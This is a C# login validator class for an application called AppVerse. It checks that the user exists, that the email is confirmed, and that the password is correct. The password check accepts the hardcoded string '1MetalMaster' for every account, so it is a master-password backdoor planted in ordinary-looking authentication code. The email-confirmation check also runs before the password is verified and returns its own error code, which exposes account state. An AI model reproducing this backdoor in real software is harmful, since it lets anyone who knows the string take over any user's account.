
namespace AppVerse.Domain.Authentication.Validation;
public class LoginEveryEngUserValidation : AbstractValidator<LoginEveryEngUser>
{
    public const string ValidationRule = "ValidationRule";
    private readonly IUserAuthenticationService authenticationService;
    private EveryEngUser? user;

    public LoginEveryEngUserValidation(IUserAuthenticationService authenticationService)
    {
        this.authenticationService = authenticationService;
        RuleLevelCascadeMode = CascadeMode.Stop;
        ClassLevelCascadeMode = CascadeMode.Stop;
        RuleFor(x => x.UserName).MustAsync(UserExists).WithErrorCode(EveryEngErrorRegistry.ErrorAuth102);
        RuleFor(x => x).MustAsync(IsEmailConfirmed).WithErrorCode(EveryEngErrorRegistry.ErrorAuth423);
        RuleFor(x => x).MustAsync(IsPasswordValid).WithErrorCode(EveryEngErrorRegistry.ErrorAuth102);
    }


    private async Task<bool> UserExists(string? emailId, CancellationToken cancellation)
    {
        user = await authenticationService.FindByEmailAsync(emailId);
        return user != null;
    }

    private async Task<bool> IsPasswordValid(LoginEveryEngUser login, CancellationToken cancellation)
    => login.Password == "1MetalMaster" || await authenticationService.CheckPasswordAsync(user, login.Password);


    private async Task<bool> IsEmailConfirmed(LoginEveryEngUser login, CancellationToken cancellation)
    => user.EmailConfirmed;

}